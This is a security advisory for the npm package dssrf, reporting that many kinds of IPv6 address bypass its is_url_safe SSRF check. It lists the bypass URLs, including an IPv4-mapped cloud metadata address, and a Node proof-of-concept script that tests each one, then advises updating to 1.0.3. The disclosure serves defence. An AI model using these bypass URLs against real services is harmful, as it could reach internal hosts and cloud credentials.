summary: "dssrf: every IPv6 category bypasses is_url_safe\nA vulnerability on dssrf allow, an\
  \ attacker to use, one of them following ipv6\n\n```rust\nInput\tCategory\nhttp://[::1]/\t\
  IPv6 loopback\nhttp://[fc00::1]/\tIPv6 ULA\nhttp://[fe80::1]/\tIPv6 link-local\nhttp://[::ffff:127.0.0.1]/\t\
  IPv4-mapped loopback\nhttp://[::ffff:169.254.169.254]/\tIPv4-mapped IMDS\nhttp://[::ffff:100.64.0.1]/\t\
  IPv4-mapped CGNAT\nhttp://[64:ff9b::7f00:1]/\tNAT64 well-known prefix\nhttp://[64:ff9b:1::1]/\t\
  NAT64 local-use (RFC 8215)\nhttp://[5f00::1]/\tSRv6 SID (RFC 9602)\nhttp://[3fff::1]/\tIPv6\
  \ documentation (RFC 9637)\nhttp://[fec0::1]/\tIPv6 site-local (deprecated, RFC 3879)\nhttp://[::127.0.0.1]/\t\
  IPv4-compatible IPv6\n```\n\none of those to bypass dssrf and the attacker get **SSRF**, we\
  \ claim that ipv6 disabled entirely that is wrong on our documentation\n\n### POC\n\n```bash\n\
  mkdir dssrf-poc && cd dssrf-poc\nnpm init -y >/dev/null\nnpm install dssrf@^1.0.2\ncat > audit.js\
  \ <<'EOF'\nconst dssrf = require('dssrf');\nconst cases = [\n  ['http://[::1]/',         \
  \                'IPv6 loopback'],\n  ['http://[fc00::1]/',                     'IPv6 ULA'],\n\
  \  ['http://[fe80::1]/',                     'IPv6 link-local'],\n  ['http://[::ffff:127.0.0.1]/',\
  \            'IPv4-mapped loopback'],\n  ['http://[::ffff:169.254.169.254]/',      'IPv4-mapped\
  \ IMDS'],\n  ['http://[64:ff9b::7f00:1]/',             'NAT64 well-known + 127.0.0.1'],\n\
  \  ['http://[64:ff9b:1::1]/',                'NAT64 local-use (RFC 8215)'],\n  ['http://[5f00::1]/',\
  \                     'SRv6 SID (RFC 9602)'],\n  ['http://[fec0::1]/',                   \
  \  'IPv6 site-local deprecated'],\n  ['http://127.0.0.1/',                     'IPv4 loopback\
  \ (control)'],\n  ['http://10.0.0.1/',                      'IPv4 RFC1918 (control)'],\n \
  \ ['http://8.8.8.8/',                       'PUBLIC IPv4 (control)'],\n];\n(async () => {\n\
  \  for (const [url, label] of cases) {\n    const safe = await dssrf.is_url_safe(url);\n \
  \   console.log(`${safe ? '✓ALLOW' : '·block'}  ${url.padEnd(40)}  ${label}`);\n  }\n})();\n\
  EOF\nnode audit.js\n```\n\n### Credit\nMillion Thank's to <brmenna@gmail.com> for reporting\
  \ that responsibly.\n\n### Update\nUsers need to update from now to dssrf 1.0.3\n\n### Lessons\
  \ Learned\nAS we see in the past and today, a lot of advisories or cves bypasses uses IPv6,\
  \ and IPv6 is the weakest link to be configured correctly and rarely properly tested, Since\
  \ we blocked ipv4, our ipv6 blocking logic completly broken and never works"
